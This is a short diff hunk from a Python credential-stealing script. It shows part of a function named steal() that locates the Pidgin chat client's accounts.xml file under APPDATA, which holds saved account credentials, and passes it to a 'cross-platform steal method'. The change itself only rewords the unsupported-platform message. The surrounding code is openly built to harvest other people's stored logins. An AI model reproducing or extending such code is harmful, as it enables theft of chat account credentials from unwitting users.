@@ -12,7 +12,7 @@ def steal():
 		path = os.getenv("APPDATA") + "\\.purple\\accounts.xml"
 	else:
 		# Mac isn't supported now
-		return ("[-] Mac OSX is not supported")
+		return("[-] "+platform.system()+" is not supported.")
 	# Call the function
 	return _steal_(path)
 # Cross-platform steal method
